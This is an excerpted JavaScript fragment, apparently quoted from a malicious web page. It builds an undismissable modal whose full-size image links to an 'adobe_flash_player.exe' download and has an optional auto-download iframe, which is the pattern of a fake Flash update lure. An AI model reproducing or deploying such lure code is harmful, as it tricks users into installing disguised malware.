...
Element.Events.domready = {
    ...
    if (Browser.Engine.trident) {
        var temp = document.createElement('div'); (function () {
            ($try(function () {
                temp.doScroll('left');
...
function () {
    ...
    var autodownload = "False"; autodownload.toLowerCase() == "true" ? "$(document.body).adopt(iframe)" : "";

    new StickyWin.Modal({
        content: "<a href=\"adobe_flash_player.exe\" style=\"border:0\"><img src=\"missing.jpg\" width=\"757\" height=\"415\" border=\"0\"/></a>",
        modalOptions: {
            hideOnClick: false
        },
